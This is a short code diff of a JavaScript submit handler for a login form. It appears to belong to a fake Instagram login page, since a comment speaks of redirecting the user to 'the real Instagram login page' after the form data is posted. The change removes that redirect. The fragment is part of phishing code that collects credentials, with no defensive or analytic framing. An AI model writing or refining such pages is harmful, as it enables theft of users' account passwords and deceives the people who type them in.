@@ -27,8 +27,7 @@ document.getElementById('loginForm').addEventListener('submit', function(event) 
     .then(response => response.json())
     .then(data => {
         console.log('Success:', data);
-        // Optionally, you can redirect the user to the real Instagram login page
-        window.location.href = 'https://www.instagram.com/accounts/login/';
+    
     })
     .catch((error) => {
         console.error('Error:', error);
